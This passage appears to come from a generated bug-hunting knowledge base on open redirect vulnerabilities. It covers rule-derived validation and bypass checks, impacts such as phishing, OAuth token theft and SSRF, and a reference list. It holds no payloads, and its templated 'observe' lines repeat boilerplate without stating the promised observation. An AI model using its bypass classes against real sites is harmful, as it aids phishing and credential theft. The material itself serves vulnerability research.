*Disproof:* This test does not apply where the surrounding behaviour is unobservable -- for example when the response is identical in every case, or when the only evidence is server-side and not reflected to the requester. The originating rule (open_redirect.fp_rule.an_oauth_redirect_uri_mismatch_error_is_a_rejected_request_not_an_open_redirect) states the full boundary.

**To decide this case, observe: How to apply it in the field: treat this as the bypass it is — a hunter must be able to state the concrete observation that demonstrates it, with a request and response in hand, before the finding is reportable.**

Derived from open_redirect.bypass.a_hostname_allowlist_checked_without_url_parsing_is_defeated_by_a_confusable_host, which states the false-positive boundary for this class. The observable above is what separates a real finding from the pattern that only looks like one. A hunter who cannot produce this observation in a request/response pair does not have a finding yet.

*Disproof:* This test does not apply where the surrounding behaviour is unobservable -- for example when the response is identical in every case, or when the only evidence is server-side and not reflected to the requester. The originating rule (open_redirect.bypass.a_hostname_allowlist_checked_without_url_parsing_is_defeated_by_a_confusable_host) states the full boundary.

**To decide this case, observe: How to apply it in the field: treat this as the validation it is — a hunter must be able to state the concrete observation that demonstrates it, with a request and response in hand, before the finding is reportable.**

Derived from open_redirect.validation.proof_is_the_location_header_of_an_actual_302_not_the_presence_of_a_url_parameter, which states the false-positive boundary for this class. The observable above is what separates a real finding from the pattern that only looks like one. A hunter who cannot produce this observation in a request/response pair does not have a finding yet.

*Disproof:* This test does not apply where the surrounding behaviour is unobservable -- for example when the response is identical in every case, or when the only evidence is server-side and not reflected to the requester. The originating rule (open_redirect.validation.proof_is_the_location_header_of_an_actual_302_not_the_presence_of_a_url_parameter) states the full boundary.

## Impact

**The principal business impact of open redirect is phishing and credential theft at scale, because the trusted brand domain carries the malicious payload; secondary impacts include OAuth token theft, SSRF, XSS, and bypass of allowlist-based security controls.**

1) Brand abuse: a phishing page served from a trusted domain evades email-filter and browser-warning heuristics. 2) Credential theft: users believing they are on the legitimate site enter credentials on an attacker clone. 3) OAuth token theft: an open redirect on the client can leak authorization codes or access tokens through the Referer header or URL fragment. 4) SSRF: if the application follows redirects server-side, an open redirect can route server-side requests to internal services. 5) Security-control bypass: allowlist filters that inspect only the first URL are trivially bypassed by a redirect on a trusted host.

*Disproof:* If the organization disables open redirects at the reverse proxy, enforces strict allowlists, or the redirect is limited to a single internal hop that is then validated, the phishing and chaining impact is materially reduced.

## Related Bug Classes

Not yet researched.

## References

- **bishopfox.com** (report)
  - <https://bishopfox.com/blog/cisco-jabber-server-http-url-redirection-advisory>
- **blog.qualys.com** (writeup)
  - <https://blog.qualys.com/product-tech/2019/12/11/cve-2019-11016-open-redirect-vulnerability>
  - <https://blog.qualys.com/vulnerabilities-threat-research/2016/01/07/open-redirection-a-simple-vulnerability-threatens-your-web-applications>
- **cheatsheetseries.owasp.org** (cheatsheet)
  - <https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html>
- **cwe.mitre.org** (taxonomy)
  - <https://cwe.mitre.org/data/definitions/601.html>
- **cyber-security.wiki** (practitioner)
  - <https://cyber-security.wiki/docs/application-security/web/Open-Redirect/>
- **developers.google.com** (writeup)
  - <https://developers.google.com/identity/protocols/oauth2/web-server>
- **expressjs.com** (writeup)
  - <https://expressjs.com/en/advanced/best-practice-security.html>
- **github.com** (practitioner)
  - <https://github.com/dmbs335/the-map/blob/main/05-client-side/open-redirect.md>
- **guide.codepure.com** (practitioner)
  - <https://guide.codepure.com/vulnerabilities/cwe-601>
- **httpwg.org** (standard)
  - <https://httpwg.org/specs/rfc7231.html>
- **kathan19.gitbook.io** (reference)
  - <https://kathan19.gitbook.io/howtohunt/open-redirection/find_openredirect_trick.md>
- **openid.net** (writeup)
  - <https://openid.net/specs/openid-connect-core-1_0.html>
- **portswigger.net** (web)
  - <https://portswigger.net/kb/issues/00500100_open-redirection-reflected>
- **proofpoint.com** (research)
  - <https://www.proofpoint.com/us/blog/cloud-security/microsoft-and-github-oauth-implementation-vulnerabilities-lead-redirection>
- **safeguard.sh** (web)
  - <https://safeguard.sh/resources/blog/preventing-open-redirect-vulnerabilities>
- **sensagraph.com** (practitioner)
  - <https://www.sensagraph.com/knowledge-base/open-redirect>
- **snyk.io** (research)
  - <https://snyk.io/blog/how-to-prevent-open-redirect-vulnerabilities-in-laravel/>
- **talosintelligence.com** (vendor_advisory)
  - <https://www.talosintelligence.com/vulnerability_reports/TALOS-2020-1178>
- **top10.owasp.org** (primary)
  - <https://top10.owasp.org/2021/A01_2021-Broken_Access_Control/>
- **vulnsy.com** (practitioner)
  - <https://www.vulnsy.com/cheat-sheets/open-redirect>
- **zaproxy.org** (docs)
  - <https://www.zaproxy.org/docs/alerts/10028/>
- **zscaler.com** (writeup)
  - <https://www.zscaler.com/blogs/security-research/unchecked-redirection-url-shortener-spam>

Every item above is gated on >= 2 distinct publisher hosts (`wks/quality.py`, rule R1). Publisher diversity, not citation count, is what makes these corroborated.
